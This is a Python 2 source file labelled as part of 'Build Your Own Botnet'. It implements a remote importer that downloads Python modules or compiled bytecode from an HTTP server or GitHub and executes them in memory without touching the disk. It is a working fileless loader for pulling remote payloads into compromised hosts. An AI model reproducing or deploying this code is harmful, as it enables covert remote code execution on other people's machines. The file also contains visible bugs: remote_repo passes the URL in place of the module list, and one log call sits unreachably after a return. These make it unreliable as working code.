#!/usr/bin/python
# -*- coding: utf-8 -*-
'Remote Importer (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import marshal
import logging
import urllib2
import threading
import contextlib

# main
if '__logger' not in globals():
    logging.basicConfig(level=logging.DEBUG if bool('--debug' in sys.argv) else logging.ERROR, handler=logging.StreamHandler()) 
    __logger = logging.getLogger(__name__)

class RemoteImporter():
    """ 
    A remote importer object which can be added to `sys.meta_path`
    to enable clients to directly import missing packages/modules
    remotely from the server.
    
    """

    def __init__(self, modules, base_url='http://localhost:8000'):
        """ 
        Create a new Remote Importer instance

        `Required`
        :param list modules:     list of packages or module names 
        :param str base_url:     base URL of the server

        `Optional`
        :param bool verbose:     enable/disable verbose output  

        """
        self.base_url     = base_url + ('/' if not base_url.endswith('/') else '')
        self.non_source   = False
        self.module_names = []
        self._fetch_names(modules, base_url)
        
    def _fetch_names(self, modules, base_url):
        globals()['__logger'].info('[*] URL is %s' % base_url)
        base  = urllib2.urlparse.urlsplit(base_url).path.strip('/').replace('/','.')
        if base in modules:
            names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
            for n in names:
                name, ext = os.path.splitext(n)
                if ext in ('.py','.pyc'):
                    module = '.'.join((base, name)) if base else name
                    if module not in self.module_names:
                        globals()['__logger'].info("[+] Adding %s to module names" % module)
                        self.module_names.append(module)
                elif not len(ext):
                    t = threading.Thread(target=self._fetch_names, args=(modules, '/'.join((base_url, n))))
                    t.daemon = True
                    t.start()

    def _fetch_compiled(self, url) :
        module_src = None
        try:
            module_compiled = urllib2.urlopen(url + 'c').read()
            try:
                module_src = marshal.loads(module_compiled[8:])
                return module_src
            except ValueError :
                pass
            try:
                module_src = marshal.loads(module_compiled[12:])
                return module_src
            except ValueError :
                pass
        except IOError as e:
            globals()['__logger'].debug("[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
        return module_src

    def find_module(self, fullname, path=None):
        """ 
        Find a module/package on the server if it exists

        `Required`
        :param str fullname:    full package name

        `Optional`
        :param str path:        remote path to search

        """
        globals()['__logger'].debug("[!] Searching for %s" % fullname)
        globals()['__logger'].debug("[!] Path is %s" % path)
        module_names = list(self.module_names) + [str(_).split('.')[0] for _ in self.module_names]
        if str(fullname).split('.')[0] not in module_names:
            globals()['__logger'].debug("[-] Not found!")
            return None
        globals()['__logger'].debug("[@] Checking if built-in >")
        try:
            loader = imp.find_module(fullname, path)
            if loader:
                return None
                globals()['__logger'].info("[-] Found locally!")
        except ImportError:
            pass
        globals()['__logger'].debug("[@] Checking if it is name repetition >")
        if fullname.split('.').count(fullname.split('.')[-1]) > 1:
            globals()['__logger'].info("[-] Found locally!")
            return None
        globals()['__logger'].info("[*] Module/Package '%s' can be loaded!" % fullname)
        return self

    def load_module(self, name):
        """ 
        Load a module/package into memory where it can be
        directly imported into the currently running process
        without downloading or installing 

        `Required`
        :param str name:    name of the module/package to load

        """
        imp.acquire_lock()
        globals()['__logger'].info("[+] Loading %s" % name)
        if name in sys.modules:
            globals()['__logger'].debug('[+] Module "%s" already loaded!' % name)
            imp.release_lock()
            return sys.modules[name]
        if name.split('.')[-1] in sys.modules:
            imp.release_lock()
            globals()['__logger'].info('[+] Module "%s" loaded as a top level module!' % name)
            return sys.modules[name.split('.')[-1]]
        module_url  = self.base_url + '%s.py' % name.replace('.', '/')
        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
        zip_url     = self.base_url + '%s.zip' % name.replace('.', '/')
        final_url   = None
        final_src   = None
        try:
            globals()['__logger'].info("[+] Trying to import as package from: '%s'" % package_url)
            package_src = None
            if self.non_source:
                package_src = self._fetch_compiled(package_url)
            if not package_src:
                package_src = urllib2.urlopen(package_url).read()
            final_src = package_src
            final_url = package_url
        except IOError as e:
            package_src = None
            globals()['__logger'].info("[-] '%s' is not a package:" % name)
        if final_src == None:
            try:
                globals()['__logger'].info("[+] Trying to import as module from: '%s'" % module_url)
                module_src = None
                if self.non_source :
                    module_src = self._fetch_compiled(module_url)
                if not module_src:
                    module_src = urllib2.urlopen(module_url).read()
                final_src = module_src
                final_url = module_url
            except IOError as e:
                module_src = None
                globals()['__logger'].debug("[!] '%s' not found in HTTP repository. Moving to next Finder." % name)
                imp.release_lock()
                return None
        globals()['__logger'].info("[+] Importing '%s'" % name)
        mod = imp.new_module(name)
        mod.__loader__ = self
        mod.__file__   = final_url
        if not package_src:
            mod.__package__ = name
        else:
            mod.__package__ = name.split('.')[0]
        mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
        globals()['__logger'].debug("[+] Ready to execute '%s' code" % name)
        exec final_src in mod.__dict__
        sys.modules[name] = mod
        globals()['__logger'].info("[+] '%s' imported succesfully!" % name)
        imp.release_lock()
        return mod

@contextlib.contextmanager
def remote_repo(modules, base_url='http://localhost:8000/'):
    """ 
    Context manager object to add a Remote Importer object 
    to `sys.meta_path`, enabling direct remote imports,
    then remove the instance from `sys.meta_path`

    `Requires`
    :param list modules:    list of packages/modules to import

    `Optional`
    :param str base_url:    base URL of server hosting modules

    """
    remote_importer = RemoteImporter(base_url)
    sys.meta_path.append(remote_importer)
    yield
    for importer in sys.meta_path:
        if importer.base_url[:-1] == base_url:
            sys.meta_path.remove(importer)

def remote_import(modules, base_url='http://localhost:8000'):
    """ 
    Use a remote_repo object to remotely import 
    packages/modules from the server directly
    into the currently running process without
    writing anything to the disk

    `Requires`
    :param list modules:    list of packages/modules to import

    `Optional`
    :param str base_url:    base URL of server hosting modules

    """
    if not base_url.startswith('http'):
        raise ValueError("argument 'base_url' must start with http:// or https://")
    with remote_repo(modules, base_url):
        for module in modules:
            try:
                exec "import %s" % module in globals()
            except ImportError as e:
                __logger.error(e)
    return {module: globals().get(module) for module in modules}

def github_import(user, repo, branch='master', module=None, commit=None):
    """ 
    Use a github_repo object to remotely import 
    packages/modules from the server directly
    into the currently running process without
    writing anything to the disk

    `Requires`
    :param str user:        github user
    :param str repo:        github repository name

    `Optional`
    :param str branch:      github repository branch
    :param str module:      github repository module
    :param str commit:      github repository commit

    """
    if not user or not repo:
        raise Exception("arguments 'user' and 'repo' are required")
    if commit and branch:
        raise Exception("arguments 'branch' and 'commit' are mutually exclusive")
    if commit:
        branch = commit
    if not module:
        module = [repo]
    base_url = 'https://raw.githubusercontent.com/{user}/{repo}/{branch}/'.format(user=user, repo=repo, branch=branch)
    with remote_repo(module, base_url):
        for name in module:
            try:
                exec "import %s" % name in globals()
                return globals()[name]
            except ImportError as e:
                __logger.error(e)
